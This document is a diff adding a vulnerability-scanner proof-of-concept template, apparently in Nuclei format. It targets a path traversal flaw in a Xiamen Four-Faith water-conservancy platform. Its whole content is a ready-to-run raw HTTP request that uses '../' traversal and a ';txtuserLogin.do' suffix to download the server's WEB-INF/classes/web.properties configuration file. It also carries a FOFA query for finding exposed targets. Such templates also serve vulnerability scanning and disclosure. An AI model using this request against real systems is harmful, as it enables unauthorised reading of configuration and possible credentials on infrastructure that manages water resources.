@@ -1,0 +1,23 @@
+id: poc-mh67xr33r4rek84p
+info:
+  name: 厦门四信通信科技有限公司水利系统txtuserLogin存在路径遍历漏洞
+  author: hacktwo
+  severity: medium
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/mh67xr33r4rek84p'
+  tags: other,2026
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: mh67xr33r4rek84p
+    fofa: title="水利信息化平台"
+http:
+- raw:
+  - 'GET /sysRole/sysExportStatist/../../stAlarmInfo/download.do;txtuserLogin.do?type=down&fileName=../WEB-INF/classes/web.properties HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Accept-Encoding: gzip, deflate'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
